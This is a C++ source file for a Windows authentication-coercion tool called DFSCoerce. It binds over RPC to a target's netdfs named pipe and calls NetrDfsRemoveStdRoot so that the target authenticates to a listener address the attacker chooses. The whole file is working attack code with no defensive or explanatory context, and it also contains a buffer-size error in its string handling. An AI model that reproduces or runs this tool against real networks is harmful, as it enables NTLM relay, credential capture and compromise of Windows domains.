// DFSCoerce.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "ms-dfsnm_h.h"
#include "ms-dtyp_h.h"
#pragma comment(lib, "RpcRT4.lib")

void main(int argc, char* argv[])
{
    if(argc<3) 
    {
        printf("Usage: IP_RECEIVE IP_DESTINATION\n");
        return;
    }
    int status;
    RPC_WSTR StringBinding;
    RPC_BINDING_HANDLE binding_handle;
    wchar_t text_wchar[100];

    char* rhost = (char*)malloc(sizeof(char) * (strlen(argv[2]) + 2));
    rhost[0] = '\\';
    rhost[1] = '\\';
    rhost[2] = '\0';

    strcat_s(rhost, strlen(argv[2]) + 3, argv[2]);
    swprintf(text_wchar, 100, L"%hs", rhost);
    

    status = RpcStringBindingCompose(
        NULL,                       // Interface's GUID, will be handled by NdrClientCall
        (RPC_WSTR)L"ncacn_np",      // Protocol sequence
        (RPC_WSTR)text_wchar, // Network address
        (RPC_WSTR)L"\\pipe\\netdfs", // Endpoint
        NULL,                       // No options here
        &StringBinding              // Output string binding
    );
    if (status != RPC_S_OK)
    {
        printf("Error al RpcStringBindingCompose: %d\n", status);
        return;
    }

    // Establecer la conexión RPC
    status = RpcBindingFromStringBinding(
        StringBinding,              // Previously created string binding
        &binding_handle                    // Output binding handle
    );
    if (status != RPC_S_OK)
    {
        printf("Error al RpcBindingFromStringBinding: %d\n", status);
        return;
    }

    swprintf(text_wchar, 100, L"%hs", argv[1]);

    printf("Attempting to coerce %s and receive connection on %s", argv[2], argv[1]);
	NetrDfsRemoveStdRoot(binding_handle, text_wchar,(WCHAR*)"test",1);
}
